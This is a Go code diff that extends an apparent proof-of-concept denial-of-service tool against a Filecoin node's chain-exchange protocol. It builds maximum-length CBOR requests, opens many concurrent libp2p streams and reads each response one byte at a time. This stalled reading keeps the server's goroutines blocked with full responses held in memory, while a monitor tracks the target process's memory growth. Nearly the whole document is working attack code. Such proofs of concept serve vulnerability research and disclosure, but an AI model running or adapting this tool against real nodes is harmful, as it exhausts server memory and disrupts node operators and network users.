@@ -12,6 +12,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/ipfs/go-cid"
@@ -25,12 +26,18 @@ import (
 
 const proto = "/fil/chain/xchg/0.0.1"
 
-// cbor encode Request{Head, Length, Options}
+/// encodeReq builds CBOR-encoded Request{Head, Length, Options}
+/// matches chain/exchange/cbor_gen.go MarshalCBOR format
 func encodeReq(heads []cid.Cid, length, opts uint64) []byte {
 	var b bytes.Buffer
+
+	/// cbor array(3)
 	b.WriteByte(0x83)
+
+	/// heads: []cid.Cid
 	b.WriteByte(0x80 | byte(len(heads)))
 	for _, c := range heads {
+		/// cid cbor tag(42) + identity multibase prefix
 		b.Write([]byte{0xd8, 0x2a})
 		cb := append([]byte{0x00}, c.Bytes()...)
 		if len(cb) < 24 {
@@ -41,8 +48,12 @@ func encodeReq(heads []cid.Cid, length, opts uint64) []byte {
 		}
 		b.Write(cb)
 	}
+
+	/// length: uint64
 	writeUint(&b, length)
+	/// options: uint64
 	writeUint(&b, opts)
+
 	return b.Bytes()
 }
 
@@ -61,6 +72,8 @@ func writeUint(w *bytes.Buffer, v uint64) {
 	}
 }
 
+/// getHead fetches chain head via JSON-RPC
+/// parses CIDs from DAG-JSON format: {"/": "bafy..."}
 func getHead(api string) ([]cid.Cid, error) {
 	resp, err := http.Post(api, "application/json",
 		strings.NewReader(`{"jsonrpc":"2.0","method":"Filecoin.ChainHead","params":[],"id":1}`))
@@ -68,12 +81,33 @@ func getHead(api string) ([]cid.Cid, error) {
 		return nil, err
 	}
 	defer resp.Body.Close()
+
 	data, _ := io.ReadAll(resp.Body)
-	var r struct{ Result struct{ Cids []cid.Cid } }
-	json.Unmarshal(data, &r)
-	return r.Result.Cids, nil
+
+	/// parse DAG-JSON cid format {"/": "bafy..."}
+	var r struct {
+		Result struct {
+			Cids []struct {
+				Root string `json:"/"`
+			} `json:"Cids"`
+		} `json:"result"`
+	}
+	if err := json.Unmarshal(data, &r); err != nil {
+		return nil, err
+	}
+
+	var cids []cid.Cid
+	for _, c := range r.Result.Cids {
+		parsed, err := cid.Decode(c.Root)
+		if err != nil {
+			return nil, err
+		}
+		cids = append(cids, parsed)
+	}
+	return cids, nil
 }
 
+/// getRSS reads VmRSS from /proc/pid/status (linux only)
 func getRSS(pid int) int64 {
 	if pid <= 0 {
 		return 0
@@ -89,12 +123,17 @@ func getRSS(pid int) int64 {
 }
 
 type result struct {
-	ok   bool
-	size int
+	ok       bool
+	bytesIn  int
+	duration time.Duration
 }
 
-func attack(ctx context.Context, h host.Host, t peer.ID, req []byte, out chan<- result) {
+/// attack opens stream, sends max-length request, stalls read to pin server memory
+/// server builds full response then blocks on write for up to 60s (WriteResDeadline)
+func attack(ctx context.Context, h host.Host, t peer.ID, req []byte, stallSec int, out chan<- result) {
 	r := result{}
+	start := time.Now()
+
 	s, err := h.NewStream(ctx, t, proto)
 	if err != nil {
 		out <- r
@@ -102,18 +141,32 @@ func attack(ctx context.Context, h host.Host, t peer.ID, req []byte, out chan<- 
 	}
 	defer s.Close()
 
+	/// send request
 	s.Write(req)
 	s.CloseWrite()
-	s.SetReadDeadline(time.Now().Add(120 * time.Second))
-	data, _ := io.ReadAll(s)
+
+	/// stall read: 1 byte per interval creates TCP backpressure
+	/// server goroutine blocks on WriteCborRPC with full response in heap
+	buf := make([]byte, 1)
+	for {
+		s.SetReadDeadline(time.Now().Add(time.Duration(stallSec) * time.Second))
+		n, err := s.Read(buf)
+		r.bytesIn += n
+		if err != nil {
+			break
+		}
+		/// slow drain keeps server blocked
+		time.Sleep(time.Duration(stallSec) * time.Second)
+	}
+
 	r.ok = true
-	r.size = len(data)
+	r.duration = time.Since(start)
 	out <- r
 }
 
 func main() {
 	if len(os.Args) < 5 {
-		fmt.Fprintf(os.Stderr, "usage: %s <api> <multiaddr> <peerid> <streams> [pid]\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "usage: %s <api> <multiaddr> <peerid> <streams> [pid] [stall_sec]\n", os.Args[0])
 		os.Exit(1)
 	}
 
@@ -123,6 +176,11 @@ func main() {
 	if len(os.Args) > 5 {
 		pid, _ = strconv.Atoi(os.Args[5])
 	}
+	/// stall interval: seconds between each 1-byte read
+	stallSec := 5
+	if len(os.Args) > 6 {
+		stallSec, _ = strconv.Atoi(os.Args[6])
+	}
 
 	heads, err := getHead(api)
 	if err != nil {
@@ -130,7 +188,8 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Length=900 (MaxRequestLength), Options=3 (Headers|Messages)
+	/// Length=900 (MaxRequestLength = policy.ChainFinality)
+	/// Options=3 (Headers|Messages)
 	req := encodeReq(heads, 900, 3)
 
 	priv, _, _ := crypto.GenerateKeyPair(crypto.Ed25519, -1)
@@ -150,44 +209,55 @@ func main() {
 	baseRSS := getRSS(pid)
 	results := make(chan result, n)
 	var wg sync.WaitGroup
+	var peakRSS int64
+
+	/// monitor RSS during attack
+	done := make(chan struct{})
+	go func() {
+		tick := time.NewTicker(500 * time.Millisecond)
+		defer tick.Stop()
+		for {
+			select {
+			case <-tick.C:
+				if rss := getRSS(pid); rss > atomic.LoadInt64(&peakRSS) {
+					atomic.StoreInt64(&peakRSS, rss)
+				}
+			case <-done:
+				return
+			}
+		}
+	}()
 
 	t0 := time.Now()
 	for i := 0; i < n; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			attack(ctx, h, target, req, results)
+			attack(ctx, h, target, req, stallSec, results)
 		}()
 	}
 	go func() { wg.Wait(); close(results) }()
 
-	var ok, total int
-	var peakRSS int64
+	var ok, totalBytes int
+	var totalDur time.Duration
 	for r := range results {
-		if rss := getRSS(pid); rss > peakRSS {
-			peakRSS = rss
-		}
 		if r.ok {
 			ok++
-			total += r.size
+			totalBytes += r.bytesIn
+			totalDur += r.duration
 		}
 	}
+	close(done)
 
+	finalRSS := getRSS(pid)
+	peak := atomic.LoadInt64(&peakRSS)
+
+	/// output
 	fmt.Printf("streams: %d/%d\n", ok, n)
-	fmt.Printf("response: %d bytes total, %d avg\n", total, total/max(ok, 1))
-	fmt.Printf("amplification: %.0fx\n", float64(total)/float64(len(req)*max(ok, 1)))
-	fmt.Printf("time: %.2fs\n", time.Since(t0).Seconds())
+	fmt.Printf("bytes recv: %d total\n", totalBytes)
+	fmt.Printf("time: %.1fs\n", time.Since(t0).Seconds())
 	if pid > 0 && baseRSS > 0 {
-		fmt.Printf("rss: %dM -> %dM (peak %dM)\n", baseRSS/1024, getRSS(pid)/1024, peakRSS/1024)
+		fmt.Printf("rss: %dM -> %dM (peak %dM, growth %dM)\n",
+			baseRSS/1024, finalRSS/1024, peak/1024, (peak-baseRSS)/1024)
 	}
-	if ok == n {
-		fmt.Println("no rate limiting")
-	}
-}
-
-func max(a, b int) int {
-	if a > b {
-		return a
-	}
-	return b
 }
